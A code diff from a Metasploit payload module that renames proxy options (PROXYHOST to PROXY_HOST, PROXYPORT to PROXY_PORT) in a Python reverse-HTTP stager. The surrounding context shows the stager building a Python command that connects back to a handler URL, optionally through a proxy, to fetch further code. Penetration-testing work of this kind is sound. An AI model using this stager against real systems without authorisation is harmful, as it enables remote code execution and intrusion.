@@ -26,8 +26,8 @@ module Metasploit3
 
     register_options(
       [
-        OptString.new('PROXYHOST', [ false, "The address of an http proxy to use", "" ]),
-        OptInt.new('PROXYPORT',    [ false, "The Proxy port to connect to", 8080 ])
+        OptString.new('PROXY_HOST', [ false, "The address of an http proxy to use", "" ]),
+        OptInt.new('PROXY_PORT',    [ false, "The Proxy port to connect to", 8080 ])
       ], Msf::Handler::ReverseHttp)
   end
 
@@ -49,10 +49,10 @@ module Metasploit3
     target_url << generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITP)
 
     cmd  = "import sys\n"
-    if datastore['PROXYHOST'].blank?
+    if datastore['PROXY_HOST'].blank?
       cmd << "o=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener']).build_opener()\n"
     else
-      proxy_url = "http://#{datastore['PROXYHOST']}:#{datastore['PROXYPORT']}"
+      proxy_url = "http://#{datastore['PROXY_HOST']}:#{datastore['PROXY_PORT']}"
       cmd << "ul=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['ProxyHandler','build_opener'])\n"
       cmd << "o=ul.build_opener(ul.ProxyHandler({'http':'#{var_escape.call(proxy_url)}'}))\n"
     end
